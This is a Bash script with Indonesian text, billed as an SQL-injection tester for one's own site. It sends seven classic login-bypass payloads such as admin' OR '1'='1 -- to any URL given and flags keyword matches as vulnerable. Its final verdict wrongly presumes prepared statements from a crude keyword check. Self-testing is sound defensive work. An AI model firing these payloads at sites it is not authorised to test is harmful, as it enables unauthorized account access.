#!/bin/bash
# ============================================
#   🛡️ SQL INJECTION TESTER (Hanya untuk web sendiri)
#   Uji form login pakai payload SQLi umum
# ============================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; NC='\033[0m'

clear
echo -e "${CYAN}╔════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  🛡️ SQL INJECTION TESTER                   ║${NC}"
echo -e "${CYAN}║  Pastikan ini WEB KAMU SENDIRI!            ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════╝${NC}"
echo ""

# Input URL
read -p "👉 Masukkan URL Web (contoh: https://gold.domain.com/login.php): " TARGET_URL
[[ -z "$TARGET_URL" ]] && { echo -e "${RED}❌ URL Kosong!${NC}"; exit 1; }

# Pastikan pakai HTTPS/HTTP
if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
    echo -e "${RED}❌ URL harus diawali http:// atau https://${NC}"
    exit 1
fi

echo -e "\n${CYAN}[1/3] Memastikan target aktif...${NC}"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -L "$TARGET_URL")

if [[ "$HTTP_CODE" != "200" ]]; then
    echo -e "${RED}❌ Target mengembalikan HTTP $HTTP_CODE. Pastikan URL benar dan web hidup.${NC}"
    exit 1
fi
echo -e "${GREEN}  ✓ Target Aktif (HTTP 200)${NC}"

# Array Payload SQLi Klasik
PAYLOADS=(
    "admin' OR '1'='1"
    "admin' OR '1'='1' --"
    "admin'--"
    "' OR 1=1 --"
    "' OR 1=1#"
    "') OR ('1'='1"
    "admin\" OR \"1\"=\"1"
)

echo -e "\n${CYAN}[2/3] Memulai uji bypass login (SQLi)...${NC}"
echo -e "${YELLOW}  (Script ini mencoba login dengan payload SQL Injection)${NC}\n"

VULN=0
COUNT=0

for PAYLOAD in "${PAYLOADS[@]}"; do
    COUNT=$((COUNT+1))
    # Encode URL untuk payload
    ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))" 2>/dev/null)
    if [[ -z "$ENCODED_PAYLOAD" ]]; then
        # Fallback kalau python gak ada
        ENCODED_PAYLOAD=$(printf %s "$PAYLOAD" | jq -sRr @uri)
    fi

    # Tembak form login (asumsi parameter 'username' dan 'password')
    # Kita cek apakah response mengandung indikasi "berhasil login" (misal redirect ke dashboard, atau hilangnya text "salah")
    RESPONSE=$(curl -s -L -X POST \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${ENCODED_PAYLOAD}&password=anypassword" \
        "$TARGET_URL")

    # Deteksi sederhana: jika response mengandung "dashboard", "profil", "logout" tapi tidak ada "salah", "error", "invalid"
    if echo "$RESPONSE" | grep -qiE "logout|dashboard|profil|welcome|selamat datang" && \
       ! echo "$RESPONSE" | grep -qiE "salah|error|invalid|gagal|ditolak"; then
        echo -e "${RED}  [VULNERABLE] Payload #$COUNT: $PAYLOAD${NC}"
        VULN=$((VULN+1))
    else
        echo -e "${GREEN}  [SAFE] Payload #$COUNT: $PAYLOAD (Ditolak)${NC}"
    fi

    sleep 1
done

echo -e "\n${CYAN}[3/3] Hasil Akhir...${NC}"
if [[ $VULN -eq 0 ]]; then
    echo -e "${GREEN}╔════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║ ✅ WEB KAMU AMAN DARI SQL INJECTION!       ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════╝${NC}"
    echo -e "Sistem PDO Prepared Statements bekerja dengan sempurna."
else
    echo -e "${RED}╔════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║ 🚨 WEB KAMU RENTAN SQL INJECTION!          ║${NC}"
    echo -e "${RED}╚════════════════════════════════════════════╝${NC}"
    echo -e "Ada $VULN payload yang tembus. Segera perbaiki query database kamu!"
fi
echo ""
